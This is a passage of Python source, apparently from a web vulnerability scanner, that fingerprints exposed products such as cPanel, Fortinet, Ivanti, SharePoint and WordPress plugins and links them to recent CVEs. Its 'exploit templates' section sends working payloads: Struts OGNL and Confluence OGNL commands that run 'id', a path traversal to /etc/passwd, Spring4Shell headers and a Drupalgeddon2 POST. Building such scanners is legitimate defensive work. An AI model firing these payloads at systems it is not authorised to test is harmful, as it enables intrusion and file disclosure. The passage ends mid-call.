            host = f"{sch}://{domain}" + (f":{port}" if port else "")
            try:
                fn = requests.head if method == "HEAD" else requests.get
                r = fn(host + path, headers=H, timeout=timeout,
                       verify=False, allow_redirects=False)
                try:
                    _tls.size = len(r.content)
                    _tls.path = path
                    _tls.generic = (
                        _is_catchall(r, base_sigs)
                        or _looks_soft_404(r)
                        or _same_as_homepage(r)
                    )
                except Exception:
                    _tls.size = ""; _tls.generic = False; _tls.path = ""
                return r, host
            except Exception:
                continue
        return None, None

    def _same_as_homepage(r):
        """True if this response is just the homepage served for an unknown path."""
        try:
            if _home["size"] < 0 or r.status_code != 200:
                return False
            if abs(len(r.content) - _home["size"]) <= max(64, _home["size"] * 0.02):
                return True
            a, b = (r.text or "")[:1500], _home["text"][:1500]
            return bool(a) and a == b
        except Exception:
            return False

    def rec(name, severity, cve, url, description, size=None):
        # Skip anything derived from a catch-all / soft-404 / homepage response.
        if getattr(_tls, "generic", False):
            return
        findings.append({
            "name": name, "severity": severity, "path": "",
            "url": url, "description": f"{description} [{cve}]",
            "status": "", "size": size if size is not None else getattr(_tls, "size", ""),
            "source": "recent_cve",
        })

    def usable(r):
        """A response is usable as evidence only if it exists, isn't a
        catch-all/soft-404/homepage echo, and carries real content."""
        if r is None:
            return False
        if getattr(_tls, "generic", False):
            return False
        try:
            if r.status_code >= 500 or len(r.content) < 40:
                return False
        except Exception:
            return False
        return True

    def evidence(r, n=4000):
        """Headers + body with every form of the requested path scrubbed out, so
        a server echoing the URL can never be mistaken for the product itself.
        (This is what previously caused phantom 'Wazuh'/'Fortinet' findings:
        a redirect Location or 404 page repeating /app/wazuh or /remote/login.)"""
        try:
            txt = (r.text or "")[:n]
        except Exception:
            txt = ""
        hdr = hdrs(r)
        blob = hdr + " " + txt
        for variant in _path_variants(getattr(_tls, "path", "")):
            blob = blob.replace(variant, " ")
            blob = blob.replace(variant.upper(), " ")
        # also scrub the domain itself (e.g. wazuh-shop.com must not match "wazuh")
        blob = blob.replace(domain, " ")
        base = domain.split(".")[0]
        if len(base) >= 3:
            blob = blob.replace(base, " ")
        return blob.lower()

    def body(r, n=4000):
        # Kept for callers that only need the (path-scrubbed) body text.
        try:
            txt = (r.text or "")[:n]
        except Exception:
            return ""
        for variant in _path_variants(getattr(_tls, "path", "")):
            txt = txt.replace(variant, " ")
        return txt

    def hdrs(r):
        try:
            return " ".join(f"{k}: {v}" for k, v in r.headers.items())
        except Exception:
            return ""

    # ── CVE-2026-41940 · cPanel & WHM pre-auth bypass (CISA KEV, ITW) ──
    def c_cpanel():
        for port, svc in ((2083, "cPanel"), (2087, "WHM")):
            try:
                r = requests.get(f"https://{domain}:{port}/login/", headers=H,
                                 timeout=4, verify=False, allow_redirects=False)
                try:
                    _tls.size = len(r.content)
                    _tls.generic = False
                    _tls.path = f":{port}/login/"
                except Exception:
                    _tls.size = ""; _tls.generic = False; _tls.path = ""
            except Exception:
                continue
            blob = (hdrs(r) + body(r, 3000)).lower()
            if any(k in blob for k in ("cpsrvd", "cpanel", "whostmgr", "whm login")):
                rec(f"{svc} Login Panel Exposed", "high", "CVE-2026-41940",
                    f"https://{domain}:{port}/login/",
                    f"{svc} exposed on port {port}. All builds after 11.40 are affected by a "
                    f"pre-auth authentication bypass actively exploited in the wild — verify the "
                    f"host runs a patched cPanel build (>= 11.130 / 110.0.114 for EOL OSes)")
                return

    # ── CVE-2025-29927 + CVE-2025-55182 · Next.js (mw auth bypass / RSC RCE) ──
    def c_nextjs():
        r, host = fetch("/")
        if r is None:
            return
        h = hdrs(r).lower()
        if "next.js" in h or "x-nextjs" in h or "/_next/static" in body(r, 6000):
            m = _re.search(r'next\.js[/ ]([\d.]+)', h)
            ver = m.group(1) if m else "unknown"
            rec(f"Next.js Detected ({ver})", "medium", "CVE-2025-29927/CVE-2025-55182",
                host + "/",
                "Next.js application fingerprinted. Verify it is patched against the middleware "
                "authorization bypass (CVE-2025-29927) and the React Server Components "
                "deserialization RCE (CVE-2025-55182)")

    # ── CVE-2025-64446 · Fortinet FortiWeb / FortiOS management exposure ──
    def c_fortinet():
        for path in ("/remote/login", "/login"):
            r, host = fetch(path, timeout=5)
            if not usable(r):
                continue
            blob = evidence(r, 3000)
            if "fortiweb" in blob:
                rec("FortiWeb Management Exposed", "high", "CVE-2025-64446",
                    host + path,
                    "FortiWeb interface exposed. Verify patch for the actively-exploited "
                    "authentication bypass / path traversal (CISA KEV)")
                return
            # Require an explicit Fortinet product string. A path echo such as
            # "/remote/login" appearing in a redirect Location or error page is
            # NOT evidence — that produced false positives on ordinary sites.
            if "fortigate" in blob or "fortios" in blob or "fortinet" in blob:
                rec("Fortinet Portal Exposed", "medium", "FORTI-KEV",
                    host + path,
                    "Fortinet SSL-VPN / management portal exposed. Review against recent FortiOS "
                    "KEVs and confirm current firmware")
                return

    # ── CVE-2025-4427/4428 EPMM · CVE-2025-22457 Connect Secure · Ivanti ──
    def c_ivanti():
        for path, prod in (("/mifs/login.jsp", "Ivanti EPMM (MobileIron)"),
                           ("/dana-na/auth/url_default/welcome.cgi", "Ivanti Connect Secure")):
            r, host = fetch(path, timeout=5)
            if not usable(r):
                continue
            blob = evidence(r, 3000)
            # A bare status code proves nothing — require an Ivanti product string.
            if not any(k in blob for k in ("ivanti", "mobileiron", "mifs", "pulse secure",
                                           "dana-na", "connect secure", "welcome.cgi")):
                continue
            if True:
                cve = "CVE-2025-4427/4428" if "EPMM" in prod else "CVE-2025-22457"
                rec(f"{prod} Exposed", "high", cve, host + path,
                    f"{prod} endpoint reachable. Verify patch level — recent Ivanti RCE/auth "
                    f"chains are on CISA KEV")
                return

    # ── CVE-2025-0108 · Palo Alto PAN-OS mgmt / GlobalProtect auth bypass ──
    def c_paloalto():
        for path in ("/global-protect/login.esp", "/php/login.php"):
            r, host = fetch(path, timeout=5)
            if usable(r) and any(k in evidence(r, 3000) for k in
                                 ("globalprotect", "global-protect", "pan-os", "palo alto")):
                rec("Palo Alto PAN-OS / GlobalProtect Exposed", "high", "CVE-2025-0108",
                    host + path,
                    "PAN-OS management / GlobalProtect portal exposed. Verify patch for the "
                    "management-interface authentication bypass (CISA KEV)")
                return

    # ── CVE-2025-31161 · CrushFTP authentication bypass (KEV) ──
    def c_crushftp():
        r, host = fetch("/WebInterface/login.html", timeout=5)
        if usable(r) and "crushftp" in evidence(r, 3000):
            rec("CrushFTP Web Interface Exposed", "high", "CVE-2025-31161",
                host + "/WebInterface/login.html",
                "CrushFTP admin interface exposed. Verify patch for the unauthenticated "
                "auth-bypass / account-takeover flaw (CISA KEV)")

    # ── CVE-2025-32432 · Craft CMS remote code execution ──
    def c_craftcms():
        r, host = fetch("/")
        if r is None:
            return
        h = hdrs(r).lower()
        if "craft cms" in h or "craftcms" in h:
            rec("Craft CMS Detected", "high", "CVE-2025-32432", host + "/",
                "Craft CMS fingerprinted via headers. Verify patch for the unauthenticated "
                "RCE in the asset-transform / image endpoint")

    # ── CVE-2025-31324 · SAP NetWeaver Visual Composer upload RCE (KEV) ──
    def c_sap():
        path = "/developmentserver/metadatauploader"
        r, host = fetch(path, timeout=6)
        if usable(r) and r.status_code in (200, 405) and any(
                k in evidence(r, 3000) for k in ("sap", "netweaver", "visual composer",
                                                 "j2ee", "metadatauploader", "com.sap")):
            rec("SAP NetWeaver Visual Composer Endpoint Exposed", "critical",
                "CVE-2025-31324", host + path,
                "The Visual Composer metadata-uploader endpoint is reachable. This is the "
                "vector for an unauthenticated file-upload RCE actively exploited in the wild "
                "(CISA KEV) — confirm the SAP note is applied")

    # ── CVE-2025-53770 · Microsoft SharePoint on-prem "ToolShell" RCE (KEV) ──
    def c_sharepoint():
        r, host = fetch("/_layouts/15/start.aspx", timeout=6)
        if r is None:
            r, host = fetch("/", timeout=6)
        if r is None:
            return
        h = hdrs(r)
        m = _re.search(r'microsoftsharepointteamservices:\s*([\d.]+)', h, _re.I)
        if m or "sharepoint" in (h + body(r, 2000)).lower():
            ver = m.group(1) if m else "unknown"
            rec(f"Microsoft SharePoint Detected ({ver})", "high", "CVE-2025-53770",
                host + "/",
                "On-prem SharePoint fingerprinted. Verify patch for the 'ToolShell' "
                "unauthenticated deserialization RCE actively exploited in the wild (CISA KEV)")

    # ── CVE-2025-24813 · Apache Tomcat partial-PUT RCE (version fingerprint) ──
    def c_tomcat():
        r, host = fetch("/docs/", timeout=5)
        blob = (hdrs(r) + body(r, 3000)) if r is not None else ""
        m = _re.search(r'Apache Tomcat/?[ ]?([\d.]+)', blob)
        if r is not None and ("Apache-Coyote" in hdrs(r) or "Apache Tomcat" in blob):
            ver = m.group(1) if m else "unknown"
            rec(f"Apache Tomcat Detected ({ver})", "medium", "CVE-2025-24813",
                host + "/docs/",
                "Tomcat fingerprinted. If the default servlet allows writes, versions before "
                "9.0.99 / 10.1.35 / 11.0.3 are vulnerable to a partial-PUT deserialization RCE")

    # ── CVE-2025-49113 · Roundcube post-auth RCE (version fingerprint) ──
    def c_roundcube():
        for path in ("/CHANGELOG.md", "/"):
            r, host = fetch(path, timeout=5)
            if r is None:
                continue
            if not usable(r):
                continue
            blob = body(r, 4000)
            if "roundcube" in evidence(r, 4000):
                m = _re.search(r'([\d]+\.[\d]+\.[\d]+)', blob)
                ver = m.group(1) if m else "unknown"
                rec(f"Roundcube Webmail Detected ({ver})", "high", "CVE-2025-49113",
                    host + path,
                    "Roundcube fingerprinted. Versions before 1.5.10 / 1.6.11 are vulnerable to "
                    "a post-auth object-injection RCE — verify patch level")
                return

    # ── CVE-2024-4577 · PHP-CGI argument injection (Windows) — fingerprint ──
    def c_php_cgi():
        r, host = fetch("/", timeout=5)
        if r is None:
            return
        h = hdrs(r)
        mp = _re.search(r'PHP/([\d.]+)', h)
        if mp and ("win" in h.lower() or "microsoft-iis" in h.lower()):
            rec(f"PHP {mp.group(1)} on Windows", "medium", "CVE-2024-4577",
                host + "/",
                "PHP on a Windows stack. If PHP runs in CGI mode, it may be vulnerable to the "
                "argument-injection RCE (CISA KEV) — verify configuration and patch")

    # ── CVE-2025-54253/54251 · Adobe Experience Manager Forms ──
    def c_aem():
        for path in ("/etc.clientlibs/", "/system/console", "/libs/granite/core/content/login.html"):
            r, host = fetch(path, timeout=5)
            # "aem" alone is far too short a token — it matches ordinary words
            # on unrelated sites. Require an unambiguous AEM fingerprint.
            if usable(r) and any(k in evidence(r, 3000) for k in
                                 ("adobe experience manager", "/etc/clientlibs",
                                  "granite.csrf", "cq-editor", "day-servlet",
                                  "/libs/granite", "adobedtm")):
                rec("Adobe Experience Manager Exposed", "high", "CVE-2025-54253/54251",
                    host + path,
                    "AEM fingerprinted. Verify patch for the AEM Forms misconfiguration / "
                    "deserialization chain (CISA KEV)")
                return

    # ── CVE-2025-61882 · Oracle E-Business Suite RCE (KEV) ──
    def c_oracle_ebs():
        for path in ("/OA_HTML/AppsLogin", "/OA_HTML/AppsLocalLogin.jsp"):
            r, host = fetch(path, timeout=5)
            if usable(r) and r.status_code in (200, 302) and any(
                    k in evidence(r, 2500) for k in ("oracle", "e-business", "ebs", "apps login")):
                rec("Oracle E-Business Suite Exposed", "critical", "CVE-2025-61882",
                    host + path,
                    "Oracle EBS login exposed. Verify the October 2025 emergency patch for the "
                    "unauthenticated RCE actively exploited in the wild (CISA KEV)")
                return

    # ── Jenkins version leak (X-Jenkins header) → CVE correlation ──
    def c_jenkins():
        r, host = fetch("/login", timeout=5)
        if r is None:
            r, host = fetch("/", timeout=5)
        if r is None:
            return
        ver = r.headers.get("X-Jenkins", "") if hasattr(r, "headers") else ""
        if ver:
            rec(f"Jenkins Detected ({ver})", "medium", "JENKINS-VER",
                host + "/",
                "Jenkins version leaked via X-Jenkins header. Correlate against advisories — "
                "e.g. CVE-2024-23897 (arbitrary file read) affects older LTS lines")

    # ── Grafana version leak (/api/health) → CVE correlation ──
    def c_grafana():
        r, host = fetch("/api/health", timeout=5)
        if r is not None and r.status_code == 200 and "version" in body(r, 1000).lower():
            m = _re.search(r'"version"\s*:\s*"([\d.]+)"', body(r, 1000))
            ver = m.group(1) if m else "unknown"
            rec(f"Grafana Detected ({ver})", "low", "GRAFANA-VER",
                host + "/api/health",
                "Grafana version exposed via /api/health. Correlate against advisories "
                "(e.g. CVE-2021-43798 path traversal on older builds)")

    # ── CVE-2025-30208 · Vite dev server exposed in production ──
    def c_vite():
        r, host = fetch("/@vite/client", timeout=5)
        if usable(r) and r.status_code == 200 and "vite" in evidence(r, 2500) \
           and any(k in evidence(r, 2500) for k in ("hmr", "import", "createhotcontext", "__vite")):
            rec("Vite Dev Server Exposed", "high", "CVE-2025-30208",
                host + "/@vite/client",
                "A Vite development server is exposed publicly. Dev servers before the fix are "
                "vulnerable to arbitrary file read via crafted query strings — it should never "
                "be internet-facing")

    # ── CVE-2025-3248 · Langflow unauthenticated RCE ──
    def c_langflow():
        for path in ("/api/v1/version", "/health"):
            r, host = fetch(path, timeout=5)
            if usable(r) and "langflow" in evidence(r, 2500):
                rec("Langflow Exposed", "critical", "CVE-2025-3248", host + path,
                    "Langflow instance exposed. Versions before 1.3.0 have an unauthenticated "
                    "code-execution flaw in the /validate/code endpoint (CISA KEV)")
                return

    # ── CVE-2025-24016 · Wazuh dashboard/server RCE ──
    def c_wazuh():
        r, host = fetch("/app/wazuh", timeout=5)
        if not usable(r):
            return
        blob = evidence(r, 3000)
        # "wazuh" must appear in the response itself — not merely echoed back
        # from the requested path (evidence() scrubs the path), and the page
        # must look like the actual dashboard.
        if "wazuh" in blob and any(k in blob for k in
                                   ("kibana", "opensearch", "elastic", "dashboard",
                                    "wazuh-app", "app/wazuh", "wzd", "security information")):
            rec("Wazuh Dashboard Exposed", "high", "CVE-2025-24016", host + "/app/wazuh",
                "Wazuh fingerprinted. Versions 4.4.0–4.9.0 are affected by an unsafe "
                "deserialization RCE in the server API — verify patch level")

    checks = [c_cpanel, c_nextjs, c_fortinet, c_ivanti, c_paloalto, c_crushftp,
              c_craftcms, c_sap, c_sharepoint, c_tomcat, c_roundcube,
              c_php_cgi, c_aem, c_oracle_ebs, c_jenkins, c_grafana, c_vite,
              c_langflow, c_wazuh]

    def _safe(fn):
        try:
            fn()
        except Exception:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        list(ex.map(_safe, checks))

    return findings


def _nuclei_exploit_templates(domain):
    """
    CVE-based and version-detection templates inspired by top Nuclei templates.
    Each check does an HTTP probe + content matching, exactly like Nuclei YAML templates.
    Categories:
      - Version fingerprinting (software/version leak → CVE correlation)
      - WordPress plugin/theme CVEs (most common web vulns)
      - Popular CMS exploits (Drupal, Joomla, Magento)
      - Framework exploits (Laravel, Django, Spring, Rails)
      - Exposed admin + default credentials indicators
      - SSRF / open redirect detection
      - Deserialization indicators
    """
    if not HAS_REQUESTS:
        return []

    findings = []
    base_https = f"https://{domain}"
    base_http  = f"http://{domain}"

    import re as _re
    import threading as _thr
    _tls = _thr.local()   # per-thread last-response size (safe under parallelism)

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    HEADERS = {"User-Agent": UA, "Accept": "*/*"}

    # Fingerprint hosts that answer every path with the same page, so a probe
    # against a non-existent path can't be mistaken for a real exposure.
    _ex_sigs = _catchall_baseline(domain)

    def probe(path, method="GET", data=None, extra_headers=None, timeout=6, schemes=None):
        """Single HTTP probe, returns (response, base_url) or (None, None).
        Responses that are catch-all pages or soft-404s (HTTP 200 whose body
        says 'not found') are rejected — they are not evidence of anything."""
        for base in (schemes or [base_https, base_http]):
            try:
                h = dict(HEADERS)
                if extra_headers:
                    h.update(extra_headers)
                if method == "POST":
                    r = requests.post(f"{base}{path}", data=data, headers=h,
                                      timeout=timeout, verify=False, allow_redirects=False)
                else:
                    r = requests.get(f"{base}{path}", headers=h,
                                     timeout=timeout, verify=False, allow_redirects=False)
                try:
                    _tls.size = len(r.content)
                except Exception:
                    _tls.size = ""
                if path not in ("", "/") and (_is_catchall(r, _ex_sigs) or _looks_soft_404(r)):
                    return None, None
                return r, base
            except Exception:
                pass
        return None, None

    def add(name, severity, path, description, cve=None, base=base_https, size=None):
        findings.append({
            "name":        name,
            "severity":    severity,
            "path":        path,
            "url":         f"{base}{path}",
            "description": description + (f" [{cve}]" if cve else ""),
            "status":      "",
            "size":        size if size is not None else getattr(_tls, "size", ""),
            "source":      "exploit_template",
        })

    def matches(text, *patterns):
        return any(_re.search(p, text, _re.I) for p in patterns)

    # ═══════════════════════════════════════════════════════
    # 1. VERSION DETECTION — fingerprint software from responses
    # ═══════════════════════════════════════════════════════

    # WordPress version detection
    r, base = probe("/feed/")
    if r and r.status_code == 200:
        m = _re.search(r'<generator>https?://wordpress\.org/\?v=([\d.]+)</generator>', r.text)
        if m:
            ver = m.group(1)
            findings.append({
                "name":        f"WordPress {ver} Detected",
                "severity":    "info",
                "path":        "/feed/",
                "url":         f"{base}/feed/",
                "description": f"WordPress version {ver} identified via /feed/ generator tag. Check for known CVEs for this version.",
                "status":      200,
                "size":        len(r.content),
                "source":      "version_detection",
            })

    # WordPress readme version
    r, base = probe("/readme.html")
    if r and r.status_code == 200:
        m = _re.search(r'[Vv]ersion\s+([\d.]+)', r.text)
        if m:
            findings.append({
                "name":     f"WordPress {m.group(1)} Version Leak",
                "severity": "info",
                "path":     "/readme.html",
                "url":      f"{base}/readme.html",
                "description": f"WordPress version {m.group(1)} exposed in readme.html",
                "status":   200,
                "size":     len(r.content),
                "source":   "version_detection",
            })

    # Drupal version
    r, base = probe("/CHANGELOG.txt")
    if r and r.status_code == 200 and "Drupal" in r.text:
        m = _re.search(r'Drupal ([\d.]+)', r.text)
        ver = m.group(1) if m else "unknown"
        add(f"Drupal {ver} Changelog Exposed", "medium", "/CHANGELOG.txt",
            f"Drupal version {ver} revealed via CHANGELOG.txt")

    r, base = probe("/core/CHANGELOG.txt")
    if r and r.status_code == 200 and "Drupal" in r.text:
        m = _re.search(r'Drupal ([\d.]+)', r.text)
        ver = m.group(1) if m else "unknown"
        add(f"Drupal {ver} Core Changelog", "medium", "/core/CHANGELOG.txt",
            f"Drupal version {ver} via core/CHANGELOG.txt")

    # Joomla version
    for path in ["/administrator/manifests/files/joomla.xml", "/language/en-GB/en-GB.xml"]:
        r, base = probe(path)
        if r and r.status_code == 200:
            m = _re.search(r'<version>([\d.]+)</version>', r.text)
            if m:
                add(f"Joomla {m.group(1)} Version Exposed", "medium", path,
                    f"Joomla version {m.group(1)} exposed in manifest file")
                break

    # Magento version
    r, base = probe("/magento_version")
    if r and r.status_code == 200:
        add("Magento Version Exposed", "medium", "/magento_version",
            f"Magento version info: {r.text[:100]}")

    r, base = probe("/RELEASE_NOTES.txt")
    if r and r.status_code == 200 and matches(r.text, "Magento"):
        add("Magento Release Notes Exposed", "medium", "/RELEASE_NOTES.txt",
            "Magento version leaked via RELEASE_NOTES.txt")

    # Laravel version via exception page
    r, base = probe("/_ignition/health-check")
    if r and r.status_code == 200 and matches(r.text, "laravel", "ignition"):
        add("Laravel Ignition Health Check", "high", "/_ignition/health-check",
            "Laravel Ignition debug endpoint is exposed")

    # Laravel Ignition RCE — CVE-2021-3129
    r, base = probe("/_ignition/execute-solution")
    if r and r.status_code in (200, 405, 500):
        body = r.text[:500]
        if matches(body, "ignition", "solution", "runnable"):
            add("Laravel Ignition RCE Endpoint", "critical", "/_ignition/execute-solution",
                "Laravel Ignition /_ignition/execute-solution potentially exposed (CVE-2021-3129)",
                cve="CVE-2021-3129")

    # Spring Boot version via /info
    r, base = probe("/info")
    if r and r.status_code == 200:
        try:
            j = r.json()
            if "build" in j or "spring" in str(j).lower():
                ver = j.get("build", {}).get("version", "unknown")
                add(f"Spring Boot /info Exposed (v{ver})", "medium", "/info",
                    f"Spring Boot /info endpoint exposes version: {ver}")
        except Exception:
            pass

    # Apache Struts version detection
    r, base = probe("/struts/webconsole.html")
    if r and r.status_code == 200:
        add("Apache Struts Webconsole Exposed", "critical", "/struts/webconsole.html",
            "Apache Struts developer console is accessible")

    # ═══════════════════════════════════════════════════════
    # 2. WORDPRESS PLUGIN CVEs (top 20 most exploited)
    # ═══════════════════════════════════════════════════════

    wp_plugin_checks = [
        # (path_indicator, plugin_name, severity, description, cve)
        ("/wp-content/plugins/all-in-one-seo-pack/", "All-in-One SEO", "medium",
         "AIOSEO plugin detected — check for SQLi CVEs", "CVE-2022-0422"),
        ("/wp-content/plugins/contact-form-7/", "Contact Form 7", "medium",
         "CF7 detected — check for file upload bypass", "CVE-2020-35489"),
        ("/wp-content/plugins/wp-file-manager/", "WP File Manager", "critical",
         "WP File Manager plugin detected — unauthenticated file upload (CVE-2020-25213)",
         "CVE-2020-25213"),
        ("/wp-content/plugins/duplicator/installer/", "Duplicator Installer",
         "critical", "Duplicator installer left accessible — info disclosure", "CVE-2020-11738"),
        ("/wp-content/plugins/woocommerce/", "WooCommerce", "info",
         "WooCommerce detected — ensure updated to latest version", None),
        ("/wp-content/plugins/elementor/", "Elementor", "info",
         "Elementor detected — check for stored XSS CVEs", None),
        ("/wp-content/plugins/revslider/", "Revolution Slider", "critical",
         "Revolution Slider detected — LFI/arbitrary file read", "CVE-2014-9734"),
        ("/wp-content/plugins/gravityforms/", "Gravity Forms", "medium",
         "Gravity Forms detected — check for unauthenticated file upload", None),
        ("/wp-content/plugins/backup-backup/", "Backup Migration", "high",
         "Backup plugin detected — path traversal vulnerability", "CVE-2023-6553"),
        ("/wp-content/plugins/wp-automatic/", "WP Automatic", "critical",
         "WP Automatic plugin detected — SQLi vulnerability", "CVE-2024-27956"),
        ("/wp-content/plugins/litespeed-cache/", "LiteSpeed Cache", "high",
         "LiteSpeed Cache detected — unauthenticated account takeover", "CVE-2024-28000"),
        ("/wp-content/plugins/really-simple-ssl/", "Really Simple SSL", "critical",
         "Really Simple SSL detected — auth bypass (2FA bypass)", "CVE-2024-10924"),
        ("/wp-content/plugins/the-events-calendar/", "The Events Calendar", "medium",
         "Events Calendar detected — SQLi vulnerability", "CVE-2024-8275"),
        ("/wp-content/plugins/anti-spam/", "Formidable Forms/Anti-Spam", "high",
         "Plugin detected — check for privilege escalation", None),
        ("/wp-content/plugins/wpforms-lite/", "WPForms", "medium",
         "WPForms detected — check for email injection", None),
    ]

    # Baseline for a NON-existent plugin path — the server's default behaviour
    # for /wp-content/plugins/<anything>/. Real plugins must respond differently.
    import random as _rnd, string as _s
    _plugin_base_sigs = _catchall_baseline(domain, prefix="/wp-content/plugins")

    def _confirm_plugin(base, path):
        """Confirm a plugin really exists by fetching a known in-plugin file
        (readme.txt) that returns real content, not the catch-all page."""
        for f in ("readme.txt", "README.txt"):
            try:
                rr = requests.get(f"{base}{path}{f}", headers=HEADERS, timeout=5,
                                  verify=False, allow_redirects=False)
                if rr.status_code == 200 and not _is_catchall(rr, _plugin_base_sigs) \
                   and not _looks_like_html(rr.content) \
                   and _re.search(r'(?i)(stable tag|=== |contributors:|plugin name)', rr.text[:2000]):
                    return len(rr.content)
            except Exception:
                pass
        return None

    def check_wp_plugin(item):
        path, name, sev, desc, cve = item
        r, base = probe(path)
        if not r:
            return None
        # Redirects (301/302) and catch-all responses are NOT evidence a plugin exists.
        if r.status_code in (301, 302, 307, 308):
            return None
        if _is_catchall(r, _plugin_base_sigs):
            return None
        # Directory listing (200 non-HTML-homepage) or a specific 403 that differs
        # from the baseline suggests the plugin dir exists — confirm via readme.
        if r.status_code not in (200, 403):
            return None
        confirmed_size = _confirm_plugin(base, path)
        if confirmed_size is None:
            # Not confirmed. Only keep a 200 that is clearly a directory index
            # (Apache "Index of") — otherwise drop to avoid false positives.
            if r.status_code == 200 and _re.search(r'(?i)index of .*/wp-content/plugins', r.text[:1000]):
                pass
            else:
                return None
        return {
            "name":        f"{name} Plugin Detected",
            "severity":    sev,
            "path":        path,
            "url":         f"{base}{path}",
            "description": desc,
            "status":      r.status_code,
            "size":        confirmed_size if confirmed_size is not None else len(r.content),
            "source":      "wp_plugin_cve",
            "cve":         cve or "",
        }

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        wp_results = list(ex.map(check_wp_plugin, wp_plugin_checks))
    findings.extend([r for r in wp_results if r])

    # ═══════════════════════════════════════════════════════
    # 3. POPULAR CVE EXPLOIT TEMPLATES
    # ═══════════════════════════════════════════════════════

    # CVE-2017-5638 — Apache Struts RCE (Content-Type injection)
    r, base = probe("/", extra_headers={
        "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}"
    })
    if r and r.status_code != 400:
        body = r.text[:200]
        if matches(body, r'uid=\d+', "root", "www-data"):
            add("Apache Struts RCE (CVE-2017-5638)", "critical", "/",
                "Apache Struts Content-Type OGNL injection RCE confirmed",
                cve="CVE-2017-5638", base=base)

    # CVE-2021-41773 — Apache HTTP Server Path Traversal
    r, base = probe("/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
    if r and r.status_code == 200 and matches(r.text, r"root:.*:/bin/"):
        add("Apache Path Traversal RCE (CVE-2021-41773)", "critical",
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "Apache 2.4.49 path traversal - /etc/passwd readable",
            cve="CVE-2021-41773", base=base)

    # CVE-2022-22965 — Spring4Shell
    r, base = probe("/", extra_headers={
        "suffix": "%>//",
        "c1":     "Runtime",
        "c2":     "<%",
        "DNT":    "1",
    })
    if r and r.status_code in (200, 400, 500):
        r2, base2 = probe("/shell.jsp")
        if r2 and r2.status_code == 200:
            add("Spring4Shell (CVE-2022-22965)", "critical", "/shell.jsp",
                "Spring Framework RCE - shell.jsp may have been created",
                cve="CVE-2022-22965", base=base2)

    # CVE-2021-44228 — Log4Shell detection (via header injection)
    # Just check if the server is vulnerable by looking for Java/Spring indicators first
    r, base = probe("/")
    if r and matches(r.headers.get("server","") + r.headers.get("x-powered-by",""),
                     "java", "spring", "tomcat", "jetty", "wildfly", "jboss"):
        findings.append({
            "name":        "Log4j / Java Server Detected (CVE-2021-44228 Risk)",
            "severity":    "high",
            "path":        "/",
            "url":         f"{base}/",
            "description": "Java-based server detected — verify Log4Shell (CVE-2021-44228) is patched. Server header: " + r.headers.get("server","") + " " + r.headers.get("x-powered-by",""),
            "status":      r.status_code,
            "source":      "exploit_template",
            "cve":         "CVE-2021-44228",
        })

    # CVE-2019-11043 — PHP-FPM RCE (Nginx + PHP-FPM)
    r, base = probe("/index.php%0a")
    if r and r.status_code == 200 and matches(r.headers.get("content-type",""), "php"):
        add("PHP-FPM Nginx RCE (CVE-2019-11043)", "critical",
            "/index.php%0a",
            "PHP-FPM Nginx path info bug may allow RCE",
            cve="CVE-2019-11043", base=base)

    # CVE-2018-7600 — Drupal RCE "Drupalgeddon2"
    r, base = probe("/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                    method="POST",
                    data={"form_id": "user_register_form", "_drupal_ajax": "1",
                          "mail[#post_render][]": "exec", "mail[#type]": "markup",
                          "mail[#markup]": "echo PWNED"})
    if r and r.status_code in (200, 500) and matches(r.text, "PWNED", "drupalgeddon"):
        add("Drupalgeddon2 RCE (CVE-2018-7600)", "critical",
            "/user/register",
            "Drupal 6/7/8 remote code execution via form API",
            cve="CVE-2018-7600", base=base)

    # CVE-2020-14882 — Oracle WebLogic Unauth RCE
    r, base = probe("/console/images/%252E%252E%252Fconsole.portal")
    if r and r.status_code == 200 and matches(r.text, "WebLogic", "Oracle"):
        add("Oracle WebLogic Console Bypass (CVE-2020-14882)", "critical",
            "/console/images/%252E%252E%252Fconsole.portal",
            "Oracle WebLogic Server unauthenticated admin console access",
            cve="CVE-2020-14882", base=base)

    # CVE-2022-26134 — Confluence OGNL RCE
    r, base = probe("/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/")
    if r and r.status_code in (200, 400) and matches(r.text, "Confluence", "Atlassian"):
        add("Confluence OGNL RCE (CVE-2022-26134)", "critical",
            "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/",
            "Atlassian Confluence OGNL injection RCE",
            cve="CVE-2022-26134", base=base)

    # CVE-2021-26084 — Confluence Server OGNL injection
    r, base = probe("/pages/doenterpagevariables.action")
    if r and r.status_code in (200, 302) and matches(r.text, "confluence", "atlassian"):
        add("Confluence Server Exposed (CVE-2021-26084 Risk)", "high",
            "/pages/doenterpagevariables.action",
            "Confluence Server detected — check for CVE-2021-26084 OGNL injection",
            cve="CVE-2021-26084", base=base)

    # CVE-2019-0232 — Apache Tomcat CGI enableCmdLineArguments RCE
    r, base = probe("/cgi-bin/test.bat?&dir")
    if r and r.status_code == 200 and matches(r.text, "Directory of", "Volume in drive"):
        add("Tomcat CGI RCE (CVE-2019-0232)", "critical",
            "/cgi-bin/test.bat?&dir",
            "Apache Tomcat CGI enableCmdLineArguments RCE",
            cve="CVE-2019-0232", base=base)

    # ═══════════════════════════════════════════════════════
    # 4. DEFAULT CREDENTIALS / ADMIN PANEL DETECTION
    # ═══════════════════════════════════════════════════════

    # Jenkins anonymous access
    r, base = probe("/jenkins/api/json")
    if r and r.status_code == 200 and matches(r.text, "_class", "jenkins"):
        add("Jenkins Unauthenticated API Access", "critical", "/jenkins/api/json",
